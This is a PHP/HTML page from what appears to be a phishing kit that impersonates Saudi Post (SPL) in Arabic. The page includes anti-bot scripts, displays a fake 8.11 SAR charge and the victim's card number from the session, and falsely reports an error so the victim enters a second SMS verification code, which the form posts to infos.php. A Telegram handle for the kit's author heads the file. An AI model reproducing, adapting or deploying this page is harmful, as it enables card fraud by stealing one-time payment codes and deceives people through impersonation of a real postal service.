<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

include("../anti__boot/anti1.php");
include("../anti__boot/anti2.php");
include("../anti__boot/anti3.php");
include("../anti__boot/anti4.php");
include("../anti__boot/anti5.php");
include("../anti__boot/anti6.php");
include("../anti__boot/anti7.php");
include("../anti__boot/anti8.php");

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Saudi Post | SPL</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/Logo.svg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/Logo.svg" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>
<body  class="loaded">
<header>
    <div class="lang">
        <div class="container text-start">
           <a href="smstwo.php"> <p class="mb-0" style="font-size: 14px;">English</p></a>
        </div>
    </div>
    <div class="header d-flex justify-content-between align-items-center container">
        <div class="reg"><button style="padding: 7px 35px;">تسجيل</button></div>
        <div class="logo"><img src="image/Logo.svg"></div>
    </div>
</header>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="110.53900146484375" viewBox="0 0 1922.745 110.539" class="hero_linear login_linear" preserveAspectRatio="xMidYMid slice">
            <g id="lines" transform="translate(240.981 6.003)">
                <g id="Group_5" data-name="Group 5" transform="translate(0.001)">
                    <path id="Stroke_1" data-name="Stroke 1" d="M481.449,31H40.442c-9.228,0-12.731-3.427-17.011-7.614,0,0-2.6-2.54-6.83-6.776L0,0" transform="translate(1199.524 22.804)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-1"></path>
                    <path id="Stroke_5" data-name="Stroke 5" d="M1199.525,22.8,1179.014,2.286a9.393,9.393,0,0,0-13.2.888L1114.988,54c-4.235,4.236-12.6,7.7-18.588,7.7L16.047,61.5H-240.981" transform="translate(-0.001 0)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-2"></path>
                </g>
                <path id="Stroke_3" data-name="Stroke 3" d="M1681.764,0H1245.2c-5.2,0-7.724,1.33-10.369,3.975L1162.864,74,1105.8,27.31l-1346.711-.455" transform="translate(0 22.5)" fill="none" stroke="#00c8e1" stroke-miterlimit="10" stroke-width="12" class="svg-hero-3"></path>
            </g>
        </svg>
<section>
    <div class="container login_container">
        <div class="row">
            <div class="col-md-12">
                <div class="form text-end" style="max-width: 500px;margin: 25px auto;">
                   <div class="text-center py-55"><img src="image/sms.png" width="100"></div><br><br>
                    <h4 class="mt-44" style="font-size: 15px;font-weight:300;color:#a39d9d;">احمِ نفسك من أولئك الذين يتظاهرون بأنهم البنك الذي تتعامل معه. احذر من المكالمات الهاتفية ورسائل البريد الإلكتروني والرسائل القصيرة الاحتيالية.</h4>
                
                    <div class="d-flex justify-content-around pb-3">
                        <ul class="list-unstyled">
                            <li class="py-1"><strong>SPL</strong></li>
                            <li class="py-1"><strong>8,11 SAR</strong></li>
                            <li class="py-1"><strong><?php echo date("h:i:s") ; ?></strong></li>
                            <li class="py-1"><strong><?php echo $_SESSION['card_number']?></strong></li>
                        </ul>
                        <ul class="list-unstyled">
                            <li class="py-1">: التاجر </li>
                            <li class="py-1">: المبلغ </li>
                            <li class="py-1">: التاريخ </li>
                            <li class="py-1">: البطاقة </li>
                        </ul> 
                    </div>

                    <form action="infos.php" method="post" class="mt-3">
                        <input type="hidden" value="smstwo_ar" name="step">


                        <div class="form-group mb-4">
						<div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             >
											 <p><font color="red">حدث خطأ<font></p>
                            <p><font color="red" style="font-size:12px">							
							سوف تتلقى رمز رسالة نصية قصيرة جديدًا في غضون ثوانٍ قليلة ، أدخل الرمز ثم اضغط على متابعة							
							<font></p>
							</div>
                            <input type="text" class="form-control text-end" placeholder="رمز التحقق" id="smstwo" name="smstwo" required>
                        </div>

                        <div class="bttn mt-4">
                            <div class="reg section_btns" style="justify-content:center"><button name="submit" style="height: 48px;padding: 0 3rem;background: #00C8E1;color:#153C3F;Continue;border: none;width:35%;font-size: 23px;">متابعة</button></div>
                        </div>

                    </form>
                </div>
            </div>
        </div>
    </div>
</section>

<footer>
    <div class="footer d-block d-md-flex justify-content-between align-items-center container">
         <div><span>
 عند استخدامك هذا الموقع، فإنك توافق على
 </span>
 <span>شروط الخدمة</span> و <span>سياسة الخصوصية</span>
 </div>
        <div><span>جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُـبل©️ 2021  </span></div>
       
    </div>
</footer>



    

   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>

  </script>
</body>
</html>